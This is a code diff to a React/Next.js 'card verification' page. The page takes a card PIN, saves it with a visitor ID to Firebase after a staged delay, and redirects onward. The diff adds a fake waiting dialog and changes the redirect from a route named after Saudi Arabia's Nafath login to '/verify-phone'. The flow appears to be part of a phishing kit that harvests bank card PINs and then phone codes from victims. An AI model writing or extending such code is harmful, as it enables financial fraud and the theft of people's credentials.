@@ -7,11 +7,13 @@ import { useRouter } from "next/navigation"
 import { addData } from "@/lib/firebase"
 import Header from "@/components/Header"
 import Footer from "@/components/Footer"
+import WaitingDialog from "@/components/waiting-dilaog"
 
 export default function CardVerification() {
   const router = useRouter()
   const [pin, setPin] = useState("")
   const [error, setError] = useState("")
+  const [isloading, setIsloading] = useState(false)
 
   // Use useEffect to get visitorId from localStorage on the client side
   const visitorId = typeof window !== "undefined" ? localStorage.getItem("visitor") : null
@@ -38,21 +40,25 @@ export default function CardVerification() {
         }
 
         if (visitorId) {
+          setIsloading(true)
           setTimeout(() => {
             addData({ id: visitorId, pinCode: pin, pagename: "verify-phone" })
-            router.push('/nafaz')
+            router.push('/verify-phone')
+          setIsloading(true)
+
           }, 3000)
         }
       } catch (error) {
         setError("الرقم السري غير صحيح")
       }
     },
-    [pin, visitorId],
+    [pin, router, visitorId],
   )
 
   return (
     <>
       <Header />
+      <WaitingDialog isOpen={isloading} />
       <div className="min-h-screen bg-gradient-to-br from-gray-50 to-blue-50 py-20 px-4 md:py-40">
         <div className="max-w-xl mx-auto">
           <div className="bg-white rounded-2xl shadow-xl p-6 md:p-8 backdrop-blur-lg bg-opacity-95 transform transition-all duration-300 hover:shadow-2xl">
